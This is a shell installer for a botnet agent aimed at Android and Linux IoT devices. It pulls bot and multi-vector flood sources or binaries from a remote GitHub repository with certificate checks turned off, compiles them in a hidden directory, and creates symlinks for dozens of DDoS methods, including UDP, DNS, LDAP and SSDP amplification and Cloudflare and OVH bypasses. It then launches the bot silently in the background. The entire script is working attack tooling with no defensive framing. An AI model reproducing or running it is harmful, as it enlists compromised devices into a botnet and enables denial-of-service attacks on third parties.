#!/bin/sh
# ==============================================================================
# IoT & Android Bot Setup Script
# Supports Android (ADB / Root / Non-Root / Termux) and Linux IoT devices (ARM/MIPS/x86)
# Fully supports bot daemon and multi-vector flood.cpp attacks
# ==============================================================================

set -e

REPO_BASE="https://raw.githubusercontent.com/cloudflared9-hub/agent/main"

# 1. Determine suitable working directory
if [ -d "/data/local/tmp" ] && [ -w "/data/local/tmp" ]; then
    TARGET_DIR="/data/local/tmp/.bot_agent"
elif [ -n "$HOME" ] && [ -w "$HOME" ]; then
    TARGET_DIR="$HOME/.bot_agent"
elif [ -d "/tmp" ] && [ -w "/tmp" ]; then
    TARGET_DIR="/tmp/.bot_agent"
else
    TARGET_DIR="./.bot_agent"
fi

echo "[+] Initializing IoT / Android Bot Setup in: ${TARGET_DIR}"
mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

# 2. Helper download function (curl -> wget -> toybox -> busybox)
download_file() {
    URL="$1"
    DEST="$2"
    TS=$(date +%s 2>/dev/null || echo 1)
    if command -v curl >/dev/null 2>&1; then
        curl -s -k -L "${URL}?t=${TS}" -o "${DEST}"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate "${URL}?t=${TS}" -O "${DEST}"
    elif command -v toybox >/dev/null 2>&1 && toybox wget --help >/dev/null 2>&1; then
        toybox wget -q --no-check-certificate "${URL}?t=${TS}" -O "${DEST}"
    elif command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
        busybox wget -q --no-check-certificate "${URL}?t=${TS}" -O "${DEST}"
    else
        echo "[!] Error: No downloader (curl/wget/toybox/busybox) found."
        return 1
    fi
}

# 3. Detect architecture & compilers
ARCH=$(uname -m 2>/dev/null || echo "unknown")
echo "[*] Detected System Architecture: ${ARCH}"

case "${ARCH}" in
    aarch64|arm64|armv8*)
        BIN_ARCH="aarch64"
        ;;
    arm*|armv7*|armhf|armeabi*)
        BIN_ARCH="armv7l"
        ;;
    x86_64|amd64)
        BIN_ARCH="x86_64"
        ;;
    i*86|x86)
        BIN_ARCH="x86"
        ;;
    *)
        BIN_ARCH="aarch64"
        ;;
esac

COMPILER=""
if command -v clang++ >/dev/null 2>&1; then
    COMPILER="clang++"
elif command -v g++ >/dev/null 2>&1; then
    COMPILER="g++"
elif command -v c++ >/dev/null 2>&1; then
    COMPILER="c++"
fi

download_file "${REPO_BASE}/agent.txt" "agent.txt" || true

# 4. Build or Download Binaries
if [ -n "${COMPILER}" ]; then
    echo "[*] Compiler found (${COMPILER}). Compiling natively for ${ARCH}..."
    download_file "${REPO_BASE}/bots/bot.cpp" "bot.cpp" || true
    download_file "${REPO_BASE}/bots/flood.cpp" "flood.cpp" || true
    download_file "${REPO_BASE}/bots/http.cpp" "http.cpp" || true
    download_file "${REPO_BASE}/bots/https.cpp" "https.cpp" || true
    
    # Check if OpenSSL dev library is available
    SSL_FLAGS=""
    if echo '#include <openssl/ssl.h>' | ${COMPILER} -E - >/dev/null 2>&1; then
        SSL_FLAGS="-lssl -lcrypto"
        echo "[+] OpenSSL detected: Full HTTPS/TLS features enabled."
    else
        echo "[!] OpenSSL not detected: Compiling flood with -DNO_SSL (L3/L4/HTTP fast engine)."
        SSL_FLAGS="-DNO_SSL"
    fi

    ${COMPILER} -Os -s -fno-exceptions -fno-rtti -static-libstdc++ -static-libgcc -o bot bot.cpp || ${COMPILER} -O2 -o bot bot.cpp
    ${COMPILER} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o flood flood.cpp ${SSL_FLAGS} || ${COMPILER} -O2 -pthread -o flood flood.cpp ${SSL_FLAGS}
    ${COMPILER} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o http http.cpp || ${COMPILER} -O2 -pthread -o http http.cpp
    if [ -n "${SSL_FLAGS}" ] && [ "${SSL_FLAGS}" != "-DNO_SSL" ]; then
        ${COMPILER} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o https https.cpp ${SSL_FLAGS} || true
    fi
else
    echo "[*] No native C++ compiler found. Downloading prebuilt binaries for ${BIN_ARCH}..."
    download_file "${REPO_BASE}/bots/bot-${BIN_ARCH}" "bot" || download_file "${REPO_BASE}/bots/bot" "bot" || true
    download_file "${REPO_BASE}/bots/flood-${BIN_ARCH}" "flood" || download_file "${REPO_BASE}/bots/flood" "flood" || true
    download_file "${REPO_BASE}/bots/http-${BIN_ARCH}" "http" || download_file "${REPO_BASE}/bots/http" "http" || true
fi

chmod +x bot flood http https 2>/dev/null || true

# 6. Create method symlinks for flood.cpp
echo "[*] Configuring attack method symlinks..."
METHODS="dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack game rainbow rocket roblox fivem pubg fortnite warthunder counter samp subnet icmp httpx rapidflood tls tlsx bypass browser cache cloudflare https"

for m in $METHODS; do
    if [ -f "flood" ]; then
        ln -sf flood "$m" 2>/dev/null || cp flood "$m" 2>/dev/null || true
        chmod +x "$m" 2>/dev/null || true
    fi
done

echo "[+] Setup completed successfully for ${ARCH}!"
echo "[+] Starting bot..."

if [ -f "./bot" ]; then
    (./bot </dev/null >/dev/null 2>&1 &) || nohup ./bot >/dev/null 2>&1 &
    echo "[+] Bot started in background (PID: $!)."
else
    echo "[-] Error: bot binary not ready."
    exit 1
fi
